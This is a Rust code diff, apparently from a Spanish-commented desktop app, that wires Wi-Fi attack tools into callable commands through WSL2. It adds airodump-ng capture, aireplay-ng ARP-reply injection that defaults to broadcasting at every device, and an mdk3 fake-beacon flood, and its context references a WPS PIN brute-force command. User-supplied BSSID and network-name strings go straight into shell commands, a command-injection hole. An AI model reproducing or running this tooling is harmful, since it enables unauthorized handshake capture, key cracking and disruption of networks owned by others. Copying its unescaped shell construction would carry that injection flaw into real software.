@@ -224,25 +224,73 @@ pub async fn wps_pin_bruteforce(app: AppHandle, bssid: String, interface: String
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// COMANDO 6 — SCAN AIRODUMP-STYLE  (netsh estructurado)
+// COMANDO 6 — SCAN AIRODUMP-STYLE  (airodump-ng real via WSL2)
 // ═══════════════════════════════════════════════════════════════════════════════
+/// Escanea redes con airodump-ng en WSL2 por la duración indicada.
+/// Usa --write-interval 1000 paraa CSV actualizado cada segundo.
+/// Devuelve el stdout de airodump-ng para que el frontend lo parsee.
 #[command]
-pub async fn scan_airodump(app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, _duration: Option<u64>) -> CmdResponse {
-    let shell = app.shell();
-    let ps_args: Vec<String> = vec!["-NoProfile".into(), "-Command".into(), "netsh wlan show networks mode=bssid".into()];
-    let ps_out = match shell.command("powershell").args(&ps_args).output().await {
-        Ok(o) => String::from_utf8_lossy(&o.stdout).into_owned(),
-        Err(e) => return CmdResponse { success: false, output: String::new(), stderr: e.to_string(), exit_code: None },
-    };
+pub async fn scan_airodump(_app: AppHandle, bssid_filter: Option<String>, channel_filter: Option<u8>, duration_secs: Option<u64>) -> CmdResponse {
+    let ch    = channel_filter.unwrap_or(0);
+    let dur   = duration_secs.unwrap_or(60);
+    let mut cmd = format!("airodump-ng --write-interval 1000 --output-format csv wlan0mon");
 
-    let mut summary = String::from("[Airodump-style scan]\n");
-    if let Some(ref b) = bssid_filter { summary.push_str(&format!("Filtro BSSID: {}\n", b)); }
-    if let Some(ch) = channel_filter     { summary.push_str(&format!("Canal: {}\n", ch)); }
-    summary.push_str("\n--- netsh raw ---\n");
-    summary.push_str(&ps_out);
-    summary.push_str("\n--- fin ---\n");
+    if ch > 0 { cmd.push_str(&format!(" --channel {}", ch)); }
+    if let Some(ref b) = bssid_filter { cmd.push_str(&format!(" --bssid {}", b)); }
+    cmd.push_str(&format!(" & sleep {}; kill $!", dur));
 
-    CmdResponse { success: true, output: summary, stderr: String::new(), exit_code: Some(0) }
+    eprintln!("[scan_airodump] ejecutando en WSL2: {}", cmd);
+    crate::wifi_adapter::wsl2_run(_app, cmd).await
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 14 — ARP REPLAY INJECT  (aireplay-ng via WSL2)
+// ═══════════════════════════════════════════════════════════════════════════════
+/// Inyecta paquetes ARP reply para amplificar/inyectar tráfico de datos.
+/// Útil para acelerar la captura de handshake o generar tráfico WEP IV.
+///
+/// - address=ff:ff:ff:ff:ff:ff → broadcast (inyecta todo dispositivo)
+/// - address=<target-mac>     → unicast a un equipo específico
+/// - target_bssid es el BSSID del AP objetivo
+/// Si se omite `count`, aireplay-ng envía paquetes hasta Ctrl+C.
+#[command]
+pub async fn arp_replay_inject(_app: AppHandle, target_bssid: String, address: Option<String>, iface: Option<String>) -> CmdResponse {
+    let iface    = iface.unwrap_or_else(|| "wlan0mon".into());
+    let addr     = address.unwrap_or_else(|| "ff:ff:ff:ff:ff:ff".into());
+    let cmd  = format!("aireplay-ng --arpreply -b {} -h {} {}", target_bssid, addr, iface);
+
+    eprintln!("[arpreply] ejecutando en WSL2: {}", cmd);
+    crate::wifi_adapter::wsl2_run(_app, cmd).await
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// COMANDO 15 — BEACON FLOOD  (mdk3 via WSL2)
+// ═══════════════════════════════════════════════════════════════════════════════
+/// Inunda el aire con beacons falsos de un AP virtual.
+/// Crea la ilusión de un AP adicional en el espectro WiFi.
+///
+/// - essid: nombre de la red falsa
+/// - bssid: MAC del AP falso (por defecto aleatoria)
+/// - channel: canal a usar (por defecto 1)
+/// - beacon_count: nº de beacons a inyectar antes de parar (0 = indefinido)
+#[command]
+pub async fn beacon_flood(_app: AppHandle, essid: String, bssid: Option<String>, channel: Option<u8>, beacon_count: Option<u32>) -> CmdResponse {
+    let bssid     = bssid.unwrap_or_else(|| "00:11:22:33:44:55".into());
+    let ch        = channel.unwrap_or(1).to_string();
+    let cnt       = beacon_count.unwrap_or(50);
+    let mut cmd   = format!("mdk3 {} b -c {} -n '{}' -s {}", iface_placeholder(), ch, essid, cnt);
+
+    cmd.push_str(&format!(" -a {}", bssid));
+
+    eprintln!("[beacon_flood] ejecutando en WSL2: {}", cmd);
+    crate::wifi_adapter::wsl2_run(_app, cmd).await
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// HELPER — placeholder de interface WSL
+// ═══════════════════════════════════════════════════════════════════════════════
+fn iface_placeholder() -> &'static str {
+    "wlan0mon"
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
